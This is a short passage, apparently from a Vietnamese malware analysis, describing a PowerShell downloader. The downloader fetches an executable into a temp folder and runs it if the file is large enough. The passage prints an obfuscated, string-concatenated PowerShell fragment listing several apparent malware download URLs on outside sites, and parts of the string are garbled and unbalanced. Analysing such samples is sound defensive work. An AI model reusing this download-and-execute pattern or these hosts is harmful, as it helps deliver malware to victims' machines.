...
- Mã độc sẽ thực hiện đoạn mã powershell để tải xuống một tệp thực thi từ url rồi lưu vào một thư mục tạm thời, sau đó thực thi tệp đó nếu nó tồn tại và có độ dài ít nhất 39850 byte.
  ...
  $Smyttl7=(('h'+'ttps:')+(('//da'+'ier'+'o'+'que.com')+('/'+'wp'+'-a'+'dmi'+'n/6wr/'+'*'+('ht')+('tp')+('//kinepr'emins')+('.c'+'l/wp-a'dm'in/6wr/'+'*'+('ht')+('tps:')+('//ke'as.y'e'c.'co.id'/s'rjn's/B/'*'ht'tps://ca'es'a'rm'o'v'ing'.'co'm/wp-content/9s/*ht'ps://ke'las.y'ec.co.id/sr'jn's/B/*https://kin'eprimins'/.c'co.id/s'rj'n'/*ht'tps://do'lo'ad'ph'i'nin'sign'ht.it/wp-i'nclu'de'/'LV'f/'f/".SPly"It"([char]42); $Tgxz2c9= (('H'+'2of')+('4'+'xd'));
